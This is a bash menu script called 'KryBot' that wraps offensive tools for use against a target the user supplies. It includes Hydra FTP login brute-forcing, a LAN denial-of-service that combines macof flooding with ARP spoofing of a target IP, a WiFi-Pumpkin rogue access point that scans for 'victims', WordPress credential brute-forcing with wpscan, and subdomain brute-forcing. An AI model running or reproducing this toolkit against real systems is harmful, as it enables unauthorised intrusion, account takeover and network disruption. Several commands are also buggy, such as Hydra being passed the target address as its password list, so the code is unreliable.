#!/bin/bash
while :
do
 clear
echo "                  "
echo "                  "
echo "                      _   __            ______       _   "
echo "                     | | / /            | ___ \     | |  "
echo "                     | |/ / _ __ _   _  | |_/ / ___ | |_ "
echo "                     |    \| '__| | | | | ___ \/ _ \| __|"
echo "                     | |\  \ |  | |_| | | |_/ / (_) | |_ "
echo "                     \_| \_/_|   \__, | \____/ \___/ \__|"
echo "                                  __/ |                  "
echo "                                 |___/  version 1.0 "
echo "                                        Developed By- Krynomore 007                "
echo "                                        www.stackneverflow.com                  "
echo "  "

echo "    ----------------------========================----------------------------"
echo "    -------------------------------------------------------------------------- "
 echo "                           KRYNOMORE 007 BOT MENU "
echo "    -------------------------------------------------------------------------- "
echo "    ----------------------========================---------------------------- "
echo " "
echo "Please Select An Option From the menu Below:"
echo " " 
 echo "1.  Open Cybrary Lectures"
 echo "2.  Open Router Login,Youtube,Facebook & Gmail"
 echo "3.  Google Search Question"
 echo "4.  Google Dorks(Exclusive)    "
 echo "5.  Scan The Network For Devices"
 echo "6.  Ping on a website "
 echo "7.  Scan for Sub - Directories"
 echo "8.  Brute Force Some ****"
 echo "9.  Scan Webserver / Website"
 echo "10.  DOS Attack (Local/Wireless) target"
 echo "11. Rogue Access Point Attack"
 echo "12. Become Anonymous(TOR IP + MAC CHANGE) "
 echo "13. Scan a Wordpress Site for errors"
 echo "14. Kill Me :( "
 echo " "
 echo -n ":::::::::: KryBot - Choose An Option Below :::::::::: "
echo " " 
############################################################################
##########Starting Switch Case to my Lazy needs. I'm very lazy ;P##########
############################################################################
 read opt
 case $opt in
  
  1)clear;
    sleep 1s;
    echo "Please Select the Video Lecture number? (1,2,3,4,...,n)";
    read num;
    clear;
    sleep 1s;
    echo "Please select which part (programming,metasploit,linux,etc.)";
    read part;
    sleep 1s;
    clear;
    echo "[+] Opening Your Video Lecture, Make sure you login first or it wont work";
    sleep 4s;
    firefox -P 'default' https://www.cybrary.it/video/$part-part-$num/ ;;

  2) clear;
     sleep 1s;
     echo "Enter Your Custom Router Address (e.g. 10.10.0.1,etc.)";
     read rout;
     clear;
     sleep 1s;
     echo "[+] Opening Facebook & Gmail for $USER Account";
     sleep 4s;
     firefox -P 'default' http://$rout/ https://www.youtube.com  https://www.gmail.com https://www.facebook.com/ ;;

  3) clear;
     sleep 1s;
     echo "Enter Your Google Search Query(dont enter spaces)";
     read query;
     clear;
     echo "[+] Opening Your Question that is : $query in firefox stay calm";
     sleep 4s;
     firefox -P 'default' search:$query ;;
 
  4) clear;
     sleep 1s;
     echo "Enter Your Custom Dork(intitle:, inrurl:,etc.)";
     read dork;
     sleep 1s;
     echo "Enter the custom input(no spaces allowed)";
     read input;
     clear;
     echo "[+] Opening the Dork : $dork:$input"
     sleep 2s;
     firefox -P 'default' $dork:$input ;;
 
  5) clear;
     sleep 1s;
     echo "----------Opening Armitage for scanning-----------------";
     sleep 2s;
     clear;
     echo "[+] Starting Postgresql for Armitage + Metasploit";
     service postgresql start;
     sleep 2s;
     echo "[+] Starting Armitage Now";
     sleep 2s;
     armitage ;;

  6) clear;
     sleep 1s;
     echo "Enter The Website Name(youtube,google,damson,etc):";
     read web;
     clear;
     sleep 1s;
     echo "Enter the Domain Extension(com,co.in,in,au,tk,etc)";
     read ext; 
     clear;
     sleep 2s;
     echo "[+] Starting To Ping : www.$web.$ext";
     sleep 3s;
     echo "";
     ping www.$web.$ext;;

  7) clear;
     sleep 1s;
     echo "Please enter the Website to Brute Force for Sub-Directories (e.g. stackneverflow.com)";
     read webs;
     clear;
     sleep 2s;
     echo "[+] Starting To Brute force directories using Fierce)";
     sleep 3s;
     clear;
     echo -e "[Recommended] Do you want to use custom Wordlists ? \nEnter the Directory of the list(e.g. ~/Downloads/rockyou.txt)";
     echo "";
     echo "1. Enter the Custom Wordlist Directory";
     echo "2. Continue With Default Wordlists";
     read io;
     echo "";
     sleep 1s;
     if [ $io -eq 1 ]
        then clear;
             sleep 1s;
             echo -e "Please Enter the Customer Directory (e.g. ~/Downloads/rockyou.txt)";
             read wordir;
             clear;
             sleep 2s;
             echo "[+] Starting To Brute force using $worddir";
             sleep 4s;
             fierce -dns $webs -wordlist $wordir;
             sleep 2s;
             clear;
             sleep 1s;
             echo "";
             echo -e "Press [Enter Key] to continue";
               read enter;
               if [ !enter ]
                 then
                    clear;
                    sleep 2s;
                    continue;
               fi
      elif [ $io -eq 2 ]
         then clear;
              sleep 1s;
              echo "[+] Starting to Brute Force Subdirectories";
              sleep 5s;
              fierce -dns $webs;
              echo "";
              echo -e "Press [Enter Key] to continue";
               read enter;
               if [ !enter ]
                 then
                    clear;
                    sleep 2s;
                    continue;
               fi
      fi;;      

  8) clear;
     sleep 1s;
     echo "What do you want?";
     echo "";
     sleep 1s;
     echo "1. For Brute Force Through THC Hydra";
     echo "2. For Windows Password(GUI)";
     echo "";
     read optnss;
      if [ $optnss -eq 1 ]
      then  clear; 
            sleep 1s;
            echo "I am Leaving the Rest Up to you (This is Out Of My Reach :( )";
            echo "";
            echo "Launching The Military Grade Services Krybot";
            echo "";
            sleep 6s;
            echo "Before I launch HYDRA you to enter the FTP address to crack login(e.g. ftp://192.168.0.1/)";
            read $addres;
            echo "Enter the Directory of Wordlists(e.g. ~/Downloads/rockyou.txt)";
            read loc;
            echo "Enter the Username (e.g. Root)";
            read re;
            echo "";
            echo "For More Usage Examples (CTRL + Z Then Type in Terminal hydra -help) ";
            echo "If Hydra Fails. Open Terminal and Type hydra -help)";
            sleep 6s; 
            clear;  
            hydra -l $re -P $addres $addres;
            break;
            
      elif [ $optnss -eq 2 ]
       then clear;
            echo "[+] Opening Firefox to show you Johns Syntax (Use Wisely) & Opening John";
            echo "";
            sleep 2s;
            echo "[+]Use Alt + Tab To switch between John & Firefox.................";
            echo ""; 
            sleep 2s;
            echo "[+] Launching in 6 seconds" 
            echo "";  
            sleep 6s;
            firefox http://www.openwall.com/john/doc/EXAMPLES.shtml;
            johnny;
      fi;;          

  9) clear;
     sleep 1s;
     echo "KryBot suugests you to first gather the IP Address of the Target";
     echo " ";
     sleep 4s;
     echo -e "If you haven't already found out the IP let me find it out for you.... \nPress [EnterKey]";
     read enter;
     if [ !enter ]
      then
           clear;
     fi
     sleep 1s;
     echo "I am Finding the IP address now okay?";
     echo "";        
     sleep 2s;
     echo "Enter 1 or 2 From Below";
     echo "";
     echo "1. Yes Do It for me Krybot";
     echo "2. Nope Don't Do That";
     read ans1;
       if [ $ans1 -eq 1 ]
          then clear;
               sleep 1s;
               clear;
               echo "Enter the Web Address (e.g. stackneverflow.com)";
               read addr;
               sleep 1s;
               clear;
               echo "[+] Lanuching nslookup on target";
               sleep 3s;
               nslookup $addr;
               sleep 1s;
               echo -e "Press [Enter Key] to continue";
               read enter;
               if [ !enter ]
                 then
                    clear;
               fi
               echo "Noted Down Your IP Address? (Type 'Y' To Continue)";
               read conti;
               if [ $conti=="Y" ] 
                  then  clear;
                        echo "Launching Your Weapon";
                        echo "";
                        sparta;
                   
               fi
        
          elif [ $ans1 -eq 2 ]
             then clear;
                  echo "";
                  echo "Launching Your Weapon";
                  echo "";
                  sparta;
             
        fi;;
       
  10) clear;
     sleep 1s;
     echo "This Tool Will Launch a Local DOS Attack";
     echo " ";  
      echo "Enter Your Target's IP";
      read tip;
      clear;
     sleep 1s;
      echo "Enter Your Gateway's IP";
      read gip;
      clear;
     sleep 1s;
      echo "Enter Your IP Address";
      read yip; 
     clear;
     sleep 1s;
     echo "Enter The Interface of attack (e.g. wlan0, eth0)";
     read inter;
     clear;
     sleep 1s;
     echo "";
     clear;
     sleep 1s;
     echo "[+]Starting DOS (Denial Of Service on $tip)";
     sleep 2s;
     echo "[+]Starting ARPSPOOF (Victim $tip and your $gip,$yip)";
     sleep 5s;
     macof -i $inter -d $tip -n 1000000000000000000000&
     sleep 1s&
     arpspoof -i $inter -t $tip $gip&
     arpspoof -i $inter -t $tip $yip;;
     
  11)clear;
     sleep 1s;
     echo " ";
     echo "------KryBot Is Starting a Rogue AP For You--------";
     echo " ";
     echo "    This module uses WiFi-Pumpkin";
     echo "    If this module fails to load";
     echo "    git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git ";
     echo "---------------------------------------------------";
     echo ""
     sleep 2s;
     echo -e "Press [Enter Key] to continue";
               read enter;
               if [ !enter ]
                 then
                    clear;
               fi
     sleep 1s;
     echo "[Recommended] Do you want me to find you some VICTIMS?? ";
     echo "Choose From Below";
     echo "1. Yes Please Bro";
     echo "2. No Bro I'm Cool";
     read yes;
     if [ $yes -eq 1 ]
     then clear;
         sleep 1s;
         service postgresql start;
         sleep 1s;
         echo "Enter Your Preferred WiFi Pumpkin Interface(e.g. wlan0, wlan1,etc)?"
         read interface;
         clear;
         sleep 1s;
         echo "[+] Loading Your Targets and Pumpkin ";
         sleep 3s;
         netdiscover -f -i $interface&
         wifi-pumpkin;
         #kill netdiscover;
         #wifi-pumpkin;
     elif [ $yes -eq 2 ]
     then clear;
          sleep 1s;
          echo "[+]Loading Rougue Wi-Fi. Press Start and Configure";
          sleep 3s;
          wifi-pumpkin;
      
     fi ;; 
     

  12)clear;
     sleep 1s; 
     echo "==-----==--Krynomore's KryBot is currently making you anonymous==---===--";
     echo "-----If this module fails by any reason-------";
     echo ""
     echo "**********Open Terminal and git clone https://github.com/HiroshiManRise/anonym8";
     echo "To Stop Protection Type anOFF & anonym8 stop";
     clear;
     sleep 1s;
     echo "To Stop Protection Type anOFF & anonym8 stop";
     sleep 2s;
     anonym8 start;
     clear;
     sleep 1s;
     echo "[Recommended] Do You want full Protection(Select Below)";
     echo "";
     echo "1. Yes Protect Me";
     echo "2. No I'm Already Wearing One ;)  ";
     read protect;
     if [ $protect -eq 1 ]
     then anON;
     elif [ $protect -eq 2 ]
     then clear;
          echo "[-] Okay as you wish. Wait Going Back to Menu";
          sleep 2s;
          continue;
     fi ;;
  13) ## SWITCH ER MODDHYE SWITCH USE KORCHI Module tae chap ache thik kore diyechi aj 1/8/17
     clear; 
     sleep 1s;
     echo "Please Enter Your Choice : "
     echo "";
     echo "1. Do You Want to Attack the Wordpress(Brute) ? ;)"
     echo "2. Do You Just Wanna Scan ? :( "
     echo "3. Return Back to Main Menu"
     ## SHURU KORCHI JANI NA OUTPUT KI ASHBE
     read opts;
     if [ $opts -eq 1 ]
      then clear;
           sleep 1s;
           echo "Please Enter the link to Wordpress Site ";
           read site;
           clear;
           sleep 1s;
           echo "Please tell what you want? (Want Usernames type 'u'?)";
           read options;
           clear;
           sleep 1s;
           echo "Do you want to use Wordlists? (Type the directory)";
           read directory;
           clear;
           sleep 1s;
           echo "[+]Starting Krynomore Bot Scan";
           sleep 4s;
           wpscan --url $site --enumerate $options --wordlist $directory --threads 30;
     elif [ $opts -eq 2 ] 
      then clear;
           sleep 1s;
           echo "Scan ? :( ";
           echo "hit Enter To Continue";
           enterkey;
           clear;
           sleep 1s;
           echo "Enter the url to scan";
           read urls;
           clear;
           sleep 1s;
           echo "[+] Starting KryBot Scan"
           sleep 4s;
           wpscan --url $urls --enumerate u;
    
   elif [ $opts -eq 3 ]
    then clear; 
         echo "Okay Taking you back to Main Menu"; 
         sleep 2s;
         continue; 
fi;;
  14) clear; 
      echo "Okay Taking you back to Terminal. Hope You Liked Me :)";
      sleep 3s;
      exit 1;
      clear;;
  

  *) clear;
     sleep 1s;
     echo "[-] Oh No! I'm Afraid this option $opt does not exist, select an option above ";
     sleep 3s;
     echo "Press ENTER key to continue ";
     read enterKey;;


esac 
done






# Designed & Developed By Krynomore 007
# Visit www.stackneverflow.com for more stuffs and bots 
